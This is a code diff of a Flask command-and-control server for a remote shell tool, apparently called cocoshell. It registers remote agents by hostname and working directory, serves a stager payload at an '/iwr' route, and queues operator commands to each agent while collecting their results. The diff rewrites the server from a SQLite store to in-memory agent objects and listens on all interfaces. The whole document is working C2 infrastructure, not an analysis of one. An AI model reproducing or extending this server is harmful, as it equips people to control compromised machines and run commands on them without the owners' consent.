@@ -1,56 +1,77 @@
-import logging, sqlite3, argparse, sys, datetime
-from os.path import exists
-from multiprocessing import Process
-from flask import Flask, session, request
-from werkzeug.exceptions import BadRequest
+import argparse, json, logging, uuid
+from flask import Flask, request, Response
+from agent import Agent
 from payload import *
-from db import Db
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
+parser.add_argument("-lp", "--lport", help="the port the agent will connect to (default: 5000)")
 parser.add_argument("-u", "--url", help="the url the agent will connect to")
-parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
-parser.add_argument("-db", "--database", help="the sqlite3 database to use")
 args, leftovers = parser.parse_known_args()
 
+#route = args.route
 route = args.route
-frequency = args.frequency if args.frequency is not None else 1
-dbname = args.database if args.database is not None else "cocoshell.db"
-db = Db(dbname)
-
+lport = args.lport if args.lport is not None else '5000'
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 api = Flask(__name__)
-#print(route, file=sys.stderr)
+agents = []
 
-@api.route('/' + route + '/<cmd>', methods=['GET', 'POST'])
-def command_handling(cmd):
-    if cmd == 'get':
-        last = db.is_command_available()
-        if last[3] == 1:
-            return ''
-        else:
-            if last[1] == "exit-agent":
-                db.reset_agent()
-            return last[1]
-    if cmd == 'post':
-        db.set_result(request.data.decode())
-        return ''
-    if cmd == 'pwd':
-        pwd = request.data.decode()
-        if pwd == "":
-            return db.get_pwd()
-        if pwd is not None:
-            db.set_pwd(pwd)
-            return ''
-    if cmd == "pulse":
-        return db.set_heartbeat()
-    if cmd == "iwr":
-        return generate_payload(args.url, frequency)
-        
-        
+@api.route('/' + route + '/register', methods=['GET', 'POST'])
+def register_agent():
+    id = str(uuid.uuid4())
+    agent = Agent(id, request.json['hostname'], request.json['cwd'])
+    agents.append(agent)
+    return agent.id
+
+@api.route('/' + route + '/iwr', methods=["GET"])
+def get_payload():
+    return generate_payload(args.url)
+
+@api.route('/' + route + '/<id>', methods=['GET', 'POST'])
+def execute_commands(id):
+    for agent in agents:
+        if agent.id == id:
+            if request.method == 'POST':
+                agent.set_result(request.data.decode())
+            elif request.method == 'GET' and not agent.has_run:
+                return agent.command
+    return ''
+
+@api.route('/agents', methods=['GET'])
+def get_agents():
+    ret = []
+    for agent in agents:
+        ret.append([agent.id, agent.hostname, agent.cwd])
+    return ret
+
+@api.route('/agents/<id>', methods=['GET', 'DELETE'])
+def get_delete_agent(id):
+    if request.method == 'GET':
+        for agent in agents:
+            if agent.id == id:
+                return [agent.id, agent.hostname, agent.cwd]
+        return []
+    elif request.method == 'DELETE':
+        for agent in agents:
+            if agent.id == id:
+                agents.remove(agent)
+                return 'True'
+        return 'False'
+
+@api.route('/cmd/<id>', methods=['GET', 'POST'])
+def set_command(id):
+    for agent in agents:
+        if agent.id == id:
+            if request.method == 'POST':
+                agent.new_command(request.data.decode())
+                return 'True'
+            elif request.method == 'GET':
+                return agent.get_result()
+    return ''
+
 if __name__ == '__main__':
     try:
-        api.run()
+        api.run(host="0.0.0.0", port=lport)
     except KeyboardInterrupt:
         exit
